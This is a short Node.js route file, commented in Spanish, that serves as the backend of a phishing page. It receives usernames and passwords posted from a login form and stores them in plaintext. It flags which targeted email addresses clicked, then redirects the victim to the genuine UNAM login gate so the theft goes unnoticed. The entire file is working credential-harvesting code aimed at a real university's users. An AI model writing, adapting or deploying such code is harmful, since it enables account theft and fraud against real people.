exports.install = function() {
    ROUTE('POST /capture-login', capture_login);
}

async function capture_login() {
    let self = this;
    let { usuario, password } = self.body;
    let email = self.query.email;  // Captura el email desde el query

    if (usuario && password) {
        // Guardar credenciales en la base de datos
        await NOSQL('logins').insert({ usuario, password, fecha: NOW });

        // Marcar en la base de datos que hicieron clic en el botón de login
        if (email) {
            await NOSQL('emails').modify({ click: true }).where('email', email);
        }
    }

    self.redirect('https://www.dgae-siae.unam.mx/www_gate.php'); // Redirigir a la página real
}

